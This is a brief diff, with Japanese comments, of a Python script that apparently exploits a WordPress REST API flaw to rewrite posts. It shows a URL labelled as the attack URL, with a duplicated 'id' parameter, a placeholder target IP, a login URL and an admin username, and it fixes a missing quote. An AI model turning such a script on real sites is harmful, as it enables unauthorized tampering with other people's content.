@@ -3,7 +3,7 @@ from bs4 import BeautifulSoup
 
 # WordPressのURLと更新対象の投稿ID
 rest_api_url = 'http://[マシンのIPアドレス]:8080/wp-json/wp/v2/posts/[記事のID]?id=[記事のID]'  # 攻撃用URL
-login_url = http://[マシンのIPアドレス]:8080/wp-login.php'
+login_url = 'http://[マシンのIPアドレス]:8080/wp-login.php'
 
 # WordPressのログイン情報と書き換えたい記事の内容
 username = 'admin'
